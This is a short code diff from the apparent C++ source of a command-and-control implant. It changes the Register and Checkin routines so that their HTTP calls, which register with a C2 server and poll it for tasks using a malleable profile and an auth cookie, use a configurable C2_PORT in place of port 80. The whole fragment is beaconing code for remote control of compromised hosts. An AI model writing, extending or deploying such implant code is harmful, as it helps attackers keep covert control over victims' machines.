@@ -37,7 +37,7 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     PSIZE_T outSize = 0;
 
     // Register
-    string res = HTTPRequest(L"POST", serverUrl, toWide(REGISTER_ENDPOINT), 80, toWide(REGISTER_USER_AGENT), toWide(CONTENT_TYPE_JSON), (LPBYTE)key_json, strlen(key_json), outSize, USE_TLS);
+    string res = HTTPRequest(L"POST", serverUrl, toWide(REGISTER_ENDPOINT), C2_PORT, toWide(REGISTER_USER_AGENT), toWide(CONTENT_TYPE_JSON), (LPBYTE)key_json, strlen(key_json), outSize, USE_TLS);
 
     // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
     DEBUG_PRINTF("Register response: %s\n", res.c_str());
@@ -74,7 +74,7 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     string authCookieString = oss.str();
     std::wstring authCookie(authCookieString.begin(), authCookieString.end());
     DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
-    string res = HTTPRequest(L"GET", serverUrl, toWide(CHECKIN_ENDPOINT), 80, string_to_lpcwstr(profile->cookie), authCookie.c_str(), NULL, 0, outSize, USE_TLS);
+    string res = HTTPRequest(L"GET", serverUrl, toWide(CHECKIN_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->cookie), authCookie.c_str(), NULL, 0, outSize, USE_TLS);
 
     if (res.empty())
     {
